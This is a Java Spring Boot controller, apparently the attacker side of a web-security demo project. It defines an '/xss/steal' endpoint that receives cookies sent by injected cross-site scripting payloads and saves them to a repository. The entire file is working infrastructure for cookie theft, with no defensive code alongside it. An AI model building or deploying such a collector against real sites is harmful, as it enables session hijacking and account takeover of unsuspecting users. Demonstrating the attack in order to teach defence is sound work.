package org.dxy.websafedemohack.controller;

import org.dxy.websafedemohack.domain.CookieSteal;
import org.dxy.websafedemohack.repository.CookieStealRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping(value = "/xss")
public class XssController {

    @Autowired
    private CookieStealRepository cookieStealRepository;

    @RequestMapping(value = "/steal")
    public String steal(String cookie) {
        cookieStealRepository.save(CookieSteal.of().setCookie(cookie));
        return "ok";
    }

}
